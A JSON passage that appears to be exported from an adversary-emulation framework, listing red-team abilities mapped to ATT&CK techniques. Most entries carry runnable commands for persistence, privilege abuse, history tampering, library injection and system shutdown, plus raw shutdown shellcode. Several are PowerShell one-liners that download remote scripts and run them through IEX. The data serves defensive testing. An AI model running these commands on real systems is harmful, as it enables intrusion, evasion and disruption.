"uploads": []}], "technique_name": "Software Discovery: Security Software Discovery", "ability_id": "61b75b3c87d87f8f1983ebf9c6e3f960", "technique_id": "T1518.001", "tactic": "discovery", "requirements": [], "name": "Security Software Discovery - ps (Linux)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Methods to identify Security Software on an endpoint\nwhen sucessfully executed, command shell  is going to display AV/Security software it is running.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "ps aux | egrep 'Little\\ Snitch|CbOsxSensorService|falcond|nessusd|santad|CbDefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|BlockBlock|LuLu'", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Software Discovery: Security Software Discovery", "ability_id": "e58589c66265f18565769c5254f5b5aa", "technique_id": "T1518.001", "tactic": "discovery", "requirements": [], "name": "Security Software Discovery - ps (macOS)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": true, "description": "Create a service named \"sandsvc\" to execute remote 54ndc57 binary named \"s4ndc4t.exe\"", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sc.exe \\\\#{remote.host.fqdn} stop sandsvc;\nsc.exe \\\\#{remote.host.fqdn} delete sandsvc /f;\ntaskkill /s \\\\#{remote.host.fqdn} /FI \"Imagename eq s4ndc4t.exe\""], "code": null, "timeout": 300, "build_target": null, "platform": "windows", "command": "sc.exe \\\\#{remote.host.fqdn} create sandsvc start= demand error= ignore binpath= \"cmd /c start C:\\Users\\Public\\s4ndc4t.exe -server #{server} -v -originLinkID #{origin_link_id}\" displayname= \"Sandcat Execution\";\nsc.exe \\\\#{remote.host.fqdn} start sandsvc;\nStart-Sleep -s 15;\nGet-Process -ComputerName #{remote.host.fqdn} s4ndc4t;", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Services: Service Execution", "ability_id": "95727b87-175c-4a69-8c7a-a5d82746a753", "technique_id": "T1569.002", "tactic": "execution", "requirements": [{"relationship_match": [{"source": "remote.host.fqdn"}], "module": "plugins.stockpile.app.requirements.no_backwards_movement"}], "name": "Service Creation", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Change Service registry ImagePath of a bengin service to a malicious file\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sc.exe delete calcservice"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\calcservice\" /f /v ImagePath /d \"%windir%\\system32\\cmd.exe\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Hijack Execution Flow: Services Registry Permissions Weakness", "ability_id": "3de4b86460576de0cab88993cb3f03cd", "technique_id": "T1574.011", "tactic": "multiple", "requirements": [], "name": "Service ImagePath Change with reg.exe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Download an executable from github and start it as a service.\nUpon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["411da5_AtomicService.exe"], "parsers": [], "cleanup": ["sc.exe stop AtomicTestService_CMD >nul 2>&1 && sc.exe delete AtomicTestService_CMD >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "sc.exe create AtomicTestService_CMD binPath= 411da5_AtomicService.exe start=auto  type=Own && sc.exe start AtomicTestService_CMD", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Create or Modify System Process: Windows Service", "ability_id": "11cd71e1b6693ab2a1bbf21c2eca0c16", "technique_id": "T1543.003", "tactic": "multiple", "requirements": [], "name": "Service Installation CMD", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Installs A Local Service via PowerShell.\nUpon successful execution, powershell will download `AtomicService.exe` from github. Powershell will then use `New-Service` and `Start-Service` to start service. Results will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["411da5_AtomicService.exe"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Stop-Service -Name \"AtomicTestService_PowerShell\" 2>&1 | Out-Null; try {(Get-WmiObject Win32_Service -filter \"name='AtomicTestService_PowerShell'\").Delete()}; catch {}"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-Service -Name \"AtomicTestService_PowerShell\" -BinaryPathName \"411da5_AtomicService.exe\"; Start-Service -Name \"AtomicTestService_PowerShell\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Create or Modify System Process: Windows Service", "ability_id": "9b43c0d47dd2e7366c830755063df400", "technique_id": "T1543.003", "tactic": "multiple", "requirements": [], "name": "Service Installation PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Service registry permissions weakness check and then which can lead to privilege escalation with ImagePath. eg.\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\" /v ImagePath /d \"C:\\temp\\AtomicRedteam.exe\"\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* |FL; get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\weakservicename |FL", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Hijack Execution Flow: Services Registry Permissions Weakness", "ability_id": "d67033955c82846f51aea6aba4afc14d", "technique_id": "T1574.011", "tactic": "multiple", "requirements": [], "name": "Service Registry Permissions Weakness", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test copies a binary into the Windows System32 folder and sets it as the screensaver so it will execute for persistence. Requires a reboot and logon.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg import %userprofile%\\backup.reg && del %userprofile%\\backup.reg && del %SystemRoot%\\System32\\evilscreensaver.scr"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg export \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" %userprofile%\\backup.reg && copy C:\\Windows\\System32\\cmd.exe \"%SystemRoot%\\System32\\evilscreensaver.scr\" && reg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1 /f && reg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveTimeout /t REG_SZ /d 60 /f && reg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f && reg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"%SystemRoot%\\System32\\evilscreensaver.scr\" /f && if 0 NEQ 0 shutdown /r /t 0", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: Screensaver", "ability_id": "506788e383957332249010fb89399634", "technique_id": "T1546.002", "tactic": "multiple", "requirements": [], "name": "Set Arbitrary Binary as Screensaver", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The \"AddToHistoryHandler\" receives the current command as the $line variable and then returns $true if \nthe line should be written to the history file. Here we simply return $false so nothing gets added to \nthe history file for the current session. \n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Set-PSReadLineOption -AddToHistoryHandler $null"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Set-PSReadLineOption -AddToHistoryHandler { return $false }", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Command History", "ability_id": "18d69a8fd988d6b63f5307ce857723c9", "technique_id": "T1070.003", "tactic": "defense-evasion", "requirements": [], "name": "Set Custom AddToHistoryHandler to Avoid History File Logging", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test sets the SetUID flag on a file in Linux and macOS.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sudo rm /tmp/evilBinary"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo touch /tmp/evilBinary; sudo chown root /tmp/evilBinary; sudo chmod u+xs /tmp/evilBinary", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sudo rm /tmp/evilBinary"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sudo touch /tmp/evilBinary; sudo chown root /tmp/evilBinary; sudo chmod u+xs /tmp/evilBinary", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid", "ability_id": "13dee93f2cdf7f027718d0c517c60c8c", "technique_id": "T1548.001", "tactic": "multiple", "requirements": [], "name": "Set a SetUID flag on file", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Stomps on the create timestamp of a file\n\nSetting the creation timestamp requires changing the system clock and reverting.\nSudo or root privileges are required to change date. Use with caution.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f /tmp/T1070.006-creation.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "NOW=$(date +%m%d%H%M%Y); date 010100001971; touch /tmp/T1070.006-creation.txt; date \"$NOW\"; stat /tmp/T1070.006-creation.txt", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f /tmp/T1070.006-creation.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "NOW=$(date +%m%d%H%M%Y); date 010100001971; touch /tmp/T1070.006-creation.txt; date \"$NOW\"; stat /tmp/T1070.006-creation.txt", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Timestomp", "ability_id": "5ffa5b3b330848d39dc1728365dad61c", "technique_id": "T1070.006", "tactic": "defense-evasion", "requirements": [], "name": "Set a file's creation timestamp", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An attacker may exploit the space before a command (e.g. \" ls\") or the duplicate command suppression feature in Bash history to prevent their commands from being recorded in the history file or to obscure the order of commands used. \n\nIn this test we 1. sets $HISTCONTROL to ignoreboth 2. clears the history cache 3. executes ls -la with a space in-front of it 4. confirms that ls -la is not in the history cache 5. sets $HISTCONTROL to erasedups 6. clears the history cache 7..9 executes ls -la $HISTFILE 3 times 10. confirms that their is only one command in history\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["export HISTCONTROL=$(echo $TEST)"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "TEST=$(echo $HISTCONTROL); if [ \"$HISTCONTROL\" != \"ignoreboth\" ]; then export HISTCONTROL=\"ignoreboth\"; fi; history -c ; ls -la $HISTFILE; if [ $(history |wc -l) -eq 1 ]; then echo \"ls -la is not in history cache\"; fi; if [ \"$HISTCONTROL\" != \"erasedups\" ]; then export HISTCONTROL=\"erasedups\"; fi; history -c ; ls -la $HISTFILE; ls -la $HISTFILE; ls -la $HISTFILE; if [ $(history |wc -l) -eq 2 ]; then echo \"Their is only one entry for ls -la $HISTFILE\"; fi", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: HISTCONTROL", "ability_id": "2801e38623f5a07972c9b2b0562ebc83", "technique_id": "T1562.003", "tactic": "defense-evasion", "requirements": [], "name": "Setting the HISTCONTROL environment variable", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An Adversary may clear, unset or redirect the history environment variable HISTFILE to prevent logging of commands to the history file after they log out of the system.\n\nNote: we don't wish to log out, so we are just confirming the value of HISTFILE. In this test we 1. echo HISTFILE 2. set it to /dev/null 3. confirm that HISTFILE is set to /dev/null.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["export HISTFILE=$(echo $TEST)"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "TEST=$(echo $HISTFILE); echo $HISTFILE; export HISTFILE=\"/dev/null\"; if [ $(echo $HISTFILE) == \"/dev/null\" ]; then echo \"\\$HISTFILE is /dev/null\"; fi", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: HISTCONTROL", "ability_id": "6401e9fc7007569199a38703f0aa0f0f", "technique_id": "T1562.003", "tactic": "defense-evasion", "requirements": [], "name": "Setting the HISTFILE environment variable", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An Adversary may set the bash history files size environment variable (HISTFILESIZE) to zero to prevent the logging of commands to the history file after they log out of the system.\n\nNote: we don't wish to log out, so we are just confirming the value of HISTFILESIZE. In this test we 1. echo HISTFILESIZE 2. set it to zero 3. confirm that HISTFILESIZE is set to zero.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["export HISTCONTROL=$(echo $TEST)"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "TEST=$(echo $HISTFILESIZE); echo $HISTFILESIZE; export HISTFILESIZE=0; if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo \"\\$HISTFILESIZE is zero\"; fi", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: HISTCONTROL", "ability_id": "844536fbe408f7127f6739462ca73668", "technique_id": "T1562.003", "tactic": "defense-evasion", "requirements": [], "name": "Setting the HISTFILESIZE environment variable", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An Adversary may take advantage of the HISTIGNORE environment variable either to ignore particular commands or all commands. \n\nIn this test we 1. set HISTIGNORE to ignore ls, rm and ssh commands 2. clear this history cache 3..4 execute ls commands 5. confirm that the ls commands are not in the history cache 6. unset HISTIGNORE variable 7.. same again, but ignoring ALL commands.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["unset HISTIGNORE"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if ((${#HISTIGNORE[@]})); then echo \"\\$HISTIGNORE = $HISTIGNORE\"; else export HISTIGNORE='ls*:rm*:ssh*'; echo \"\\$HISTIGNORE = $HISTIGNORE\"; fi; history -c ; ls -la $HISTFILE; ls -la ~/.bash_logout; if [ $(history |wc -l) -eq 1 ]; then echo \"ls commands are not in history\"; fi; unset HISTIGNORE; if ((${#HISTIGNORE[@]})); then echo \"\\$HISTIGNORE = $HISTIGNORE\"; else export HISTIGNORE='*'; echo \"\\$HISTIGNORE = $HISTIGNORE\"; fi; history -c ; whoami; groups; if [ $(history |wc -l) -eq 0 ]; then echo \"History cache is empty\"; fi", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: HISTCONTROL", "ability_id": "f86efd3fbbde634b600d0c5bbd2bd2fe", "technique_id": "T1562.003", "tactic": "defense-evasion", "requirements": [], "name": "Setting the HISTIGNORE environment variable", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Enumerate Domain Shares the current user has access. Upon execution, progress info about each share being scanned will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Network Share Discovery", "ability_id": "4b325a29e936cd1ccac2292bc92a31b5", "technique_id": "T1135", "tactic": "discovery", "requirements": [], "name": "Share Discovery with PowerView", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.\n\nUpon successful execution, bash will echo `../bin/T1574.006.so` to /etc/ld.so.preload. \n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sudo sed -i 's#/tmp/T1574006.so##' /etc/ld.so.preload"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sudo sh -c 'echo /tmp/T1574006.so > /etc/ld.so.preload'", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Hijack Execution Flow: LD_PRELOAD", "ability_id": "c214325cdad9e7f8099cea7c890d4156", "technique_id": "T1574.006", "tactic": "multiple", "requirements": [], "name": "Shared Library Injection via /etc/ld.so.preload", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test injects a shared object library via the LD_PRELOAD environment variable to execute. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.\n\nUpon successful execution, bash will utilize LD_PRELOAD to load the shared object library `/etc/ld.so.preload`. Output will be via stdout.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "LD_PRELOAD=/tmp/T1574006.so ls", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Hijack Execution Flow: LD_PRELOAD", "ability_id": "3d4732e94edec084f95224e4169c767d", "technique_id": "T1574.006", "tactic": "multiple", "requirements": [], "name": "Shared Library Injection via LD_PRELOAD", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This module runs the Windows executable of SharpHound in order to remotely list members of the local Administrators group (SAMR)\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item -Recurse $env:TEMP\\SharpHound\\ -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-Item -Path \"$env:TEMP\\SharpHound\\\" -ItemType Directory > $null; & \"$env:TEMP\\SharpHound.exe\" -d \"$env:UserDnsDomain\" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory \"$env:TEMP\\SharpHound\\\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Permission Groups Discovery: Local Groups", "ability_id": "6e5ddcde678698ef20f1a9d90d81cf23", "technique_id": "T1069.001", "tactic": "discovery", "requirements": [], "name": "SharpHound3 - LocalAdmin", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This module injects shellcode into a newly created process and executes. By default the shellcode is created,\nwith Metasploit, for use on x86-64 Windows 10 machines.\n\nNote: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation of Microsoft Office\nis required.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["40c65d_T1055-macrocode.txt"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"40c65d_T1055-macrocode.txt\" -officeProduct \"Word\" -sub \"Execute\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Process Injection", "ability_id": "6b55fcd6d1b26db7252faac7cf27a2ee", "technique_id": "T1055", "tactic": "multiple", "requirements": [], "name": "Shellcode execution via VBA", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test to simulate shortcut modification and then execute. example shortcut (*.lnk , .url) strings check with powershell;\ngci -path \"C:\\Users\" -recurse -include *.url -ea SilentlyContinue | Select-String -Pattern \"exe\" | FL.\nUpon execution, calc.exe will be launched.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del -f %temp%\\T1547.009_modified_shortcut.url >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "echo [InternetShortcut] > %temp%\\T1547.009_modified_shortcut.url && echo URL=C:\\windows\\system32\\calc.exe >> %temp%\\T1547.009_modified_shortcut.url && %temp%\\T1547.009_modified_shortcut.url", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Shortcut Modification", "ability_id": "f64e72ba624a18d79c329f6bc9878cfc", "technique_id": "T1547.009", "tactic": "multiple", "requirements": [], "name": "Shortcut Modification", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Read and Display System Intergrety Protection status. csrutil is commonly used by malware and post-exploitation tools to determine whether certain files and directories on the system are writable or not.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "csrutil status", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": "043e9d0185322f75cfcecd7ff48b9814", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "Show System Integrity Protection status (MacOS)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Show all hidden files on MacOS\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["defaults write com.apple.finder AppleShowAllFiles NO"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "defaults write com.apple.finder AppleShowAllFiles YES", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Hide Artifacts: Hidden Files and Directories", "ability_id": "5827b7a328cbb3c5068ee8477c8c9be3", "technique_id": "T1564.001", "tactic": "defense-evasion", "requirements": [], "name": "Show all hidden files", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Show if a user account has ever logged in remotely\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f /tmp/T1087.001.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ -x \"$(command -v lastlog)\" ]; then : ; else sudo apt-get install login; exit 1;; fi;  ;  lastlog > /tmp/T1087.001.txt; cat /tmp/T1087.001.txt", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Local Account", "ability_id": "c93306256db4e763315631b158c37d78", "technique_id": "T1087.001", "tactic": "discovery", "requirements": [], "name": "Show if a user account has ever logged in remotely", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test shuts down a Windows system.\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "shutdown /s /t 1", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "System Shutdown/Reboot", "ability_id": "870fe83b763d6cb8c2edc46112250bb6", "technique_id": "T1529", "tactic": "impact", "requirements": [], "name": "Shutdown System - Windows", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test shuts down a Linux system using `halt`.\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "halt -p", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Shutdown/Reboot", "ability_id": "991b57c6ea9ab986d904928e57c5163a", "technique_id": "T1529", "tactic": "impact", "requirements": [], "name": "Shutdown System via `halt` - Linux", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test shuts down a Linux system using `poweroff`.\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "poweroff", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Shutdown/Reboot", "ability_id": "c17af196907f72450ed545de754fee45", "technique_id": "T1529", "tactic": "impact", "requirements": [], "name": "Shutdown System via `poweroff` - Linux", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test shuts down a macOS/Linux system using a halt.\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "shutdown -h now", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "shutdown -h now", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Shutdown/Reboot", "ability_id": "e7defb71a411a050c650ab0901520109", "technique_id": "T1529", "tactic": "impact", "requirements": [], "name": "Shutdown System via `shutdown` - macOS/Linux", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Force shutdown a target system using Process Injection and raw shellcode", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "0x48, 0x31, 0xc0, 0x48, 0x31, 0xd2, 0x50, 0x6a, 0x77, 0x66, 0x68, 0x6e, 0x6f, 0x48, 0x89, 0xe3, 0x50, 0x66, 0x68, 0x2d, 0x68, 0x48, 0x89, 0xe1, 0x50, 0x49, 0xb8, 0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x49, 0xba, 0x73, 0x68, 0x75, 0x74, 0x64, 0x6f, 0x77, 0x6e, 0x41, 0x52, 0x41, 0x50, 0x48, 0x89, 0xe7, 0x52, 0x53, 0x51, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xc0, 0x3b, 0x0f, 0x05", "language": null, "name": "shellcode_amd64", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "0x48, 0x31, 0xc0, 0x48, 0x31, 0xd2, 0x50, 0x6a, 0x77, 0x66, 0x68, 0x6e, 0x6f, 0x48, 0x89, 0xe3, 0x50, 0x66, 0x68, 0x2d, 0x68, 0x48, 0x89, 0xe1, 0x50, 0x49, 0xb8, 0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x49, 0xba, 0x73, 0x68, 0x75, 0x74, 0x64, 0x6f, 0x77, 0x6e, 0x41, 0x52, 0x41, 0x50, 0x48, 0x89, 0xe7, 0x52, 0x53, 0x51, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xc0, 0x3b, 0x0f, 0x05", "language": null, "name": "shellcode_386", "variations": [], "uploads": []}], "technique_name": "Endpoint Denial of Service", "ability_id": "0821b0b0-7902-4a7b-8052-80bda5a43684", "technique_id": "T1499", "tactic": "impact", "requirements": [], "name": "Shutdown Target System", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Leverage Mavinject (signed binary) for DLL injection", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$explorer = Get-Process -Name 